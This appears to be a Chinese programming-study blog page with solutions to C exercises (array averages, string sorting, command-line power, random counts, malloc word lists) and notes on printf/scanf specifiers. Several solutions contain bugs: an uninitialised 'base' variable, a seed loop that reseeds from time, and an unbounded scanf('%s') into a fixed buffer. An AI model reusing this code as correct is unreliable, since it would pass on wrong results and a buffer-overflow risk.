&#123;</span><br><span class="line">    double data[ROWS][COLUMNS];</span><br><span class="line"></span><br><span class="line">    input_data(ROWS, COLUMNS, data);</span><br><span class="line"></span><br><span class="line">    //print row averages</span><br><span class="line">    printf(&quot;Row Averages:\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; ROWS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;\t Average for row %d: %3.f\n&quot;, i + 1,</span><br><span class="line">               compute_row_average(data[i], COLUMNS));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //print array average</span><br><span class="line">    printf(&quot;Average for entire array: %.3f\n&quot;,</span><br><span class="line">           compute_array_average(ROWS,COLUMNS, data));</span><br><span class="line"></span><br><span class="line">    // print largest value</span><br><span class="line">    printf(&quot;Maximum array value: %.3f\n&quot;,</span><br><span class="line">           largest_vlue(ROWS, COLUMNS, data));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void input_data(int rows, int columns, double array[][5])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Enter 3 groups of 5 double values each:\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; rows; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Grop %d:&quot;, i + 1);</span><br><span class="line">        for (int j = 0; j &lt; columns; j++)</span><br><span class="line">            scanf(&quot;%lf&quot;, array[i] + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double compute_row_average(double *array, int cols)</span><br><span class="line">&#123;</span><br><span class="line">    double total = 0;</span><br><span class="line">    for (int i = 0; i &lt; cols; i++)</span><br><span class="line">        total += array[i];</span><br><span class="line"></span><br><span class="line">    return total / cols;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double compute_array_average(int rows, int cols, double array[rows][cols])</span><br><span class="line">&#123;</span><br><span class="line">    double total = 0;</span><br><span class="line">    for (int i = 0; i &lt; rows; i++)</span><br><span class="line">        for (int j = 0; j &lt; cols; j++)</span><br><span class="line">            total += array[i][j];</span><br><span class="line"></span><br><span class="line">    return total / (rows * cols);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double largest_vlue(int rows, int cols, double array[rows][cols])</span><br><span class="line">&#123;</span><br><span class="line">    double max = array[0][0];</span><br><span class="line">    for (int i = 0; i &lt; rows; i++)</span><br><span class="line">        for (int j = 0; j &lt; cols; j++)</span><br><span class="line">            if (array[i][j] &gt; max)</span><br><span class="line">                max = array[i][j];</span><br><span class="line"></span><br><span class="line">    return max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个函数，读入10个字符串或者读到EOF时停止。该程序为用户提供一个有5个选项的菜单：打印源字符串列表、以ASCII中的顺序打印字<br>符串、按长度递增顺序打印字符串、按字符串中第1个单词的长度打印字符串、退出。菜单可以循环显示，除非用户选择退出选项。当然，该程序要能真正完成菜单中各选项的功能。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;ctype.h&gt;</span><br><span class="line"></span><br><span class="line">#define COUNT 10</span><br><span class="line">#define LIMIT 50</span><br><span class="line"></span><br><span class="line">void sort_ASCII(char *strings[], int n);</span><br><span class="line">void sort_length(char *strings[], int n);</span><br><span class="line">int fwlen(char *string);</span><br><span class="line">void sort_firstword_length(char *strings[], int n);</span><br><span class="line">char * get(char *string, int n);</span><br><span class="line">void print_menu(void);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    char strings[COUNT][LIMIT];</span><br><span class="line">    char *strptrs[COUNT];</span><br><span class="line">    char * success;</span><br><span class="line">    char ch;</span><br><span class="line"></span><br><span class="line">    // initialize array of pointer</span><br><span class="line">    for (int i = 0; i &lt; COUNT; i++)</span><br><span class="line">        strptrs[i] = strings[i];</span><br><span class="line"></span><br><span class="line">    printf(&quot;Enter up to 10 strings (EOF to stop): \n&quot;);</span><br><span class="line"></span><br><span class="line">    //read up to ten strings from input</span><br><span class="line">    for (int i = 0; i &lt; COUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d: &quot;, i + 1);</span><br><span class="line">        success = get(strings[i], LIMIT);</span><br><span class="line"></span><br><span class="line">        // if EOF encountered, stop reading strings</span><br><span class="line">        if (!success)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">    print_menu();</span><br><span class="line">    while((ch = getchar()) != &#x27;q&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        //discard rest of the line</span><br><span class="line">        if (ch != &#x27;\n&#x27;)</span><br><span class="line">            while (getchar() != &#x27;\n&#x27;)</span><br><span class="line">                continue;</span><br><span class="line"></span><br><span class="line">        // sort strings</span><br><span class="line">        switch (ch) &#123;</span><br><span class="line">            case (&#x27;a&#x27;):</span><br><span class="line">                sort_ASCII(strptrs, COUNT);</span><br><span class="line">                break;</span><br><span class="line">            case (&#x27;l&#x27;):</span><br><span class="line">                sort_length(strptrs, COUNT);</span><br><span class="line">                break;</span><br><span class="line">            case (&#x27;f&#x27;):</span><br><span class="line">                sort_firstword_length(strptrs, COUNT);</span><br><span class="line">                break;</span><br><span class="line">            case (&#x27;o&#x27;):</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                printf(&quot;Invalid input. Try again.\n\n&quot;);</span><br><span class="line">                print_menu();</span><br><span class="line">                continue;</span><br><span class="line">        &#125;</span><br><span class="line">        // print sorted strings</span><br><span class="line">        puts(&quot;&quot;);</span><br><span class="line">        for (int i = 0; i &lt; COUNT; i++)</span><br><span class="line">            puts(strptrs[i]);</span><br><span class="line"></span><br><span class="line">        puts(&quot;&quot;);</span><br><span class="line">        print_menu();</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Bye&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sort_ASCII(char *strings[], int n)</span><br><span class="line">&#123;</span><br><span class="line">    // sort array of string pointers by ASCII collating sequence</span><br><span class="line"></span><br><span class="line">    char *tmp;</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">        for (int j = 0; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (strcmp(strings[i], strings[j]) &gt; 0)</span><br><span class="line">            &#123;</span><br><span class="line">                    tmp = strings[i];</span><br><span class="line">                    strings[i] = strings[j];</span><br><span class="line">                    strings[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sort_length(char *strings[], int n)</span><br><span class="line">&#123;</span><br><span class="line">    // sort array of string pointer by length</span><br><span class="line"></span><br><span class="line">    char *tmp;</span><br><span class="line"></span><br><span class="line">    // 冒泡排序</span><br><span class="line">    for (int i = 0; i &lt; n - 1; i++)</span><br><span class="line">        for (int j = i + 1; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (strlen(strings[i]) &gt; strlen(strings[j]))</span><br><span class="line">            &#123;</span><br><span class="line">                tmp = strings[i];</span><br><span class="line">                strings[i] = strings[j];</span><br><span class="line">                strings[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fwlen(char *string)</span><br><span class="line">&#123;</span><br><span class="line">    // return length of first word of string</span><br><span class="line"></span><br><span class="line">    int length = 0;</span><br><span class="line"></span><br><span class="line">    // skip leading whitespace</span><br><span class="line">    while (isspace(*string))</span><br><span class="line">        string++;</span><br><span class="line"></span><br><span class="line">    // count first word length</span><br><span class="line">    while (!isspace(*string))</span><br><span class="line">    &#123;</span><br><span class="line">        length++;</span><br><span class="line">        string++;</span><br><span class="line">    &#125;</span><br><span class="line">    return  length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void sort_firstword_length(char *strings[], int n)</span><br><span class="line">&#123;</span><br><span class="line">    // sort array of string pointers by ASCII collating sequence</span><br><span class="line"></span><br><span class="line">    char *tmp;</span><br><span class="line"></span><br><span class="line">    for (int i =  0; i &lt; n; i++)</span><br><span class="line">        for (int j = i + 1; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (fwlen(strings[i]) &gt; fwlen(strings[j]))</span><br><span class="line">            &#123;</span><br><span class="line">                tmp  = strings[i];</span><br><span class="line">                strings[i] = strings[j];</span><br><span class="line">                strings[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char * get(char *string, int n)</span><br><span class="line">&#123;</span><br><span class="line">    // wrapper for fgets that repalces first newline with null</span><br><span class="line"></span><br><span class="line">    char *ret_val = fgets(string, n, stdin);</span><br><span class="line">    while (*string != &#x27;\0&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (*string == &#x27;\n&#x27;)</span><br><span class="line">            *string = &#x27;\0&#x27;;</span><br><span class="line">        string++;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print_menu(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;Choose an option: &quot;);</span><br><span class="line">    puts(&quot;(o) Print strings in original order.&quot;);</span><br><span class="line">    puts(&quot;(a) Print strings in ASCII collating sequence.&quot;);</span><br><span class="line">    puts(&quot;(l) Print strings ordered by length.&quot;);</span><br><span class="line">    puts(&quot;(f) Print strings ordered by length of the first word.&quot;);</span><br><span class="line">    puts(&quot;(q) Quit.&quot;);</span><br><span class="line">    puts(&quot;&quot;);</span><br><span class="line">    puts(&quot;Enter a character: &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个通过命令行运行的程序计算幂。第1个命令行参数是double类型的数，作为幂的底数，第2个参数是整数，作为幂的指数。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">void print_error_message(void);</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    double base;</span><br><span class="line">    long power;</span><br><span class="line">    char *end;</span><br><span class="line"></span><br><span class="line">    if (argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        print_error_message();</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // get exponent</span><br><span class="line">    end = argv[2];</span><br><span class="line">    while(*end != &#x27;\0&#x27;)</span><br><span class="line">        end++;</span><br><span class="line">    power = strtol(argv[2], &amp;end, 10);</span><br><span class="line"></span><br><span class="line">    if(*end)    //error condition</span><br><span class="line">    &#123;</span><br><span class="line">        print_error_message();</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;           //strtol 函数会将 end 指向转换后的字符串的最后一个字符的下一个位置，通常是字符串的结束符 \0。</span><br><span class="line"></span><br><span class="line">    printf(&quot;%f ^ %ld = %f\n&quot;, base, power, pow(base, power));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print_error_message(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;Usage: &lt;program_name&gt; &lt;arg1 base:double&gt; &lt;arg2 power:int&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个程序，生成1000个1～10范围内的随机数。不用保存或打印这些数字，仅打印每个数出现的次数。用 10 个不同的种子值运行，生成的<br>数字出现的次数是否相同？可以使用本章自定义的函数或ANSI C的rand()和srand()函数，它们的格式相同。这是一个测试特定随机数生成器随机性的方法。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"></span><br><span class="line">#define SIZE 1000</span><br><span class="line">#define RANGE 10</span><br><span class="line"></span><br><span class="line">void generate_random_numbers(void);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    for (int seed= 1; seed &lt;= 10; seed++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Seed: %d\n&quot;, seed);</span><br><span class="line">        generate_random_numbers();</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void generate_random_numbers(void)</span><br><span class="line">&#123;</span><br><span class="line">    srand((unsigned int) time(NULL));      // 设置种子值为当前时间</span><br><span class="line"></span><br><span class="line">    int counts[RANGE] = &#123;0&#125;;      // 用于记录每个数字出现的次数</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; SIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int random_count = rand() % RANGE + 1;      // 生成1~10范围内的随机数</span><br><span class="line">        counts[random_count - 1]++;     // 更新对应数字出现次数的计数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 打印每个数字出现的次数</span><br><span class="line">    for (int i = 0; i &lt; RANGE; i++)</span><br><span class="line">        printf(&quot;Number %d: %d times\n&quot;, i + 1, counts[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个符合以下描述的函数。首先，询问用户需要输入多少个单词。然后，接收用户输入的单词，并显示出来，使用malloc()并回答第1个问<br>题（即要输入多少个单词），创建一个动态数组，该数组内含相应的指向char的指针（注意，由于数组的每个元素都是指向char的指针，所以用于储<br>存malloc()返回值的指针应该是一个指向指针的指针，且它所指向的指针指向char）。在读取字符串时，该程序应该把单词读入一个临时的char数组，使用malloc()分配足够的存储空间来储存单词，并把地址存入该指针数组（该数组中每个元素都是指向 char 的指针）。然后，从临时数组中把单词拷贝到动态分配的存储空间中。因此，有一个字符指针数组，每个指针都指向一个对象，该对象的大小正好能容纳被储存的特定单词。下面是该程序的一个运行示例：</li>
</ol>
<p>How many words do you wish to enter? 5<br>Enter 5 words now:<br>I enjoyed doing this exerise<br>Here are your words:<br>I<br>enjoyed<br>doing<br>this<br>exercise</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define MAX_WORD_LENGTH 20      // 单词的最大长度</span><br><span class="line"></span><br><span class="line">void get_words(int n);</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    int num_words;</span><br><span class="line"></span><br><span class="line">    printf(&quot;How many words do you wish to enter?&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;num_words);</span><br><span class="line"></span><br><span class="line">    while (getchar() != &#x27;\n&#x27;)</span><br><span class="line">        continue;       // 清楚输入缓冲区</span><br><span class="line"></span><br><span class="line">    if (num_words &gt; 0)</span><br><span class="line">        get_words(num_words);</span><br><span class="line">    else</span><br><span class="line">        printf(&quot;No words to enter.\n&quot;);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_words(int n)</span><br><span class="line">&#123;</span><br><span class="line">    char **words = (char **)malloc(n * sizeof(char *));     // 动态分配存储单词指针的数组</span><br><span class="line">    if (words == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr, &quot;Memory allocation failed. Exiting,\n&quot;);</span><br><span class="line">        exit(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Enter %d words now:\n&quot;, n);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        char temp[MAX_WORD_LENGTH];</span><br><span class="line">        scanf(&quot;%s&quot;, temp);      // 读取单词到临时数组中</span><br><span class="line">        words[i] = (char *) malloc((strlen(temp) + 1) * sizeof(char));      // 为单词分配存储空间</span><br><span class="line">        if (words[i] == NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            fprintf(stderr, &quot;Memory allocation failed. Exiting.\n&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        strcpy(words[i], temp);     // 复制单词到动态分配的存储空间中</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Here are your words:\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">        printf(&quot;%s\n&quot;, words[i]);</span><br><span class="line"></span><br><span class="line">    // 释放分配的内存</span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">        free(words[i]);</span><br><span class="line">    free(words);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="复习题"><a href="#复习题" class="headerlink" title="复习题"></a>复习题</h1><p>假设在测试程序时要暂时跳过一块代码，如何在不移除这块代码的前提下完成这项任务？</p>
<p>使用条件编译指令。一种方法是使用<code>#ifndef</code>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define _SKIP_      /* 如果不需要跳过代码，则删除这条指令 */</span><br><span class="line">#ifndef _SKIP_</span><br><span class="line"></span><br><span class="line">/* 需要跳过的代码 */</span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2023/10/10/C-language/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/10/C-language/" class="post-title-link" itemprop="url">C language</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2023-10-10 15:45:41" itemprop="dateCreated datePublished" datetime="2023-10-10T15:45:41+08:00">2023-10-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:43:55" itemprop="dateModified" datetime="2024-04-28T09:43:55+08:00">2024-04-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="常量命名"><a href="#常量命名" class="headerlink" title="常量命名"></a>常量命名</h1><p>有一个不常用的命名约定，即在名称前带c<em>或k</em>前缀来表示常量（如，c_level或k_line）。</p>
<h1 id="显示八进制和十六进制"><a href="#显示八进制和十六进制" class="headerlink" title="显示八进制和十六进制"></a>显示八进制和十六进制</h1><p>在C程序中，既可以使用和显示不同进制的数。不同的进制要使用不同的转换说明。以十进制显示数字，使用<code>%d</code>；以八进制显示数字，使用<code>%o</code>；以十六进制显示数字，使用<code>%x</code>。另外，要显示各进制数的前缀<code>0</code>、<code>0x</code>和<code>0X</code>必须分别使用<code>%#o</code>、<code>%#x</code>、<code>%#X</code>。，</p>
<h1 id="打印short、long、long-long和unsigned类型"><a href="#打印short、long、long-long和unsigned类型" class="headerlink" title="打印short、long、long long和unsigned类型"></a>打印short、long、long long和unsigned类型</h1><p>打印unsigned int类型的值，使用%u转换说明；打印long类型的值，使用<code>%ld</code>转换说明。如果系统中int和long的大小相同，使用<code>%d</code>就行。但是，这样的程序被移植到其他系统（int和long类型的大小不同）中会无法正常工作。在x和o前面可以使用l前缀，<code>%lx</code>表示以<code>十六进制格式打印long类型整数</code>，<code>%lo</code>表示以<code>八进制格式打印long类型整数</code>。</p>
<ul>
<li>注意，虽然C允许使用大写或小写的常量后缀，但是在转换说明中只能用小写。</li>
</ul>
<p>C语言有多种<code>printf()</code>格式。对于short类型，可以使用h前缀。<code>%hd</code>表示以<code>十进制显示short类型的整数</code>，<code>%ho</code>表示以<code>八进制显示short类型的整数</code>。h和l前缀都可以和u一起使用，用于表示无符号类型。例如，<code>%lu</code>表示打印<code>unsigned long类型</code>的值。</p>
<h1 id="scanf"><a href="#scanf" class="headerlink" title="scanf()"></a>scanf()</h1><p><code>scanf()</code>的输入形式，<code>scanf(&quot;%d&quot;,&amp;Alphabet)</code> 要先将<code>%d</code>包含以后才能使用<code>&amp;</code>进行传参。</p>
<h1 id="打印浮点数"><a href="#打印浮点数" class="headerlink" title="打印浮点数"></a>打印浮点数</h1><p>十六进制浮点数<br><code>printf(&quot;And it&#39;s %a in hexadecimal, powers of 2 notation\n&quot;,a boat);</code></p>
<h1 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h1><p><img src="/image/printf(" alt="ANSI C标准 printf() 转换说明">转换标准.png)</p>
<p><img src="/image/printf(" alt="printf()的修饰符">的修饰符.png)<br><strong>注意类型可移植性</strong></p>
<p><img src="/image/printf(" alt="printf()中的标记">中的标记.png)</p>
<h1 id="scanf-1"><a href="#scanf-1" class="headerlink" title="scanf()"></a>scanf()</h1><p><img src="/image/scanf(" alt="ANSI C中scanf()的转换说明">转换说明.png)</p>
<p><img src="/image/scanf(" alt="scanf()转换说明中的修饰符">转换说明中的修饰符.png)<br><img src="/image/scanf(" alt="scanf()转换说明中的修饰符续">转换说明中的修饰符续.png)</p>
<ul>
<li><code>scanf()</code> 更像是获取单词的函数，而不是获取整个字符串的函数。</li>
<li>使用 <code>%s</code> 转换说明时，<code>scanf()</code> 会从第一个非空白字符开始，读取直到遇到下一个空白字符（空格、制表符、换行符等）为止。</li>
<li>如果指定了字段宽度，如 <code>%10s</code>，<code>scanf()</code> 将读取指定数量的字符或者在遇到第一个空白字符时停止（以先满足条件为准）。<br><img src="/image/字段宽度和scanf(" alt="字段宽度和scanf()">.png)</li>
</ul>
<p><code>scanf()</code>的典型用法是读取并转换混合数据类型为某种标准形式。<br>例如，如果输入行包含一种工具名、库存量和单价，就可以使用<code>scanf()</code>。</p>
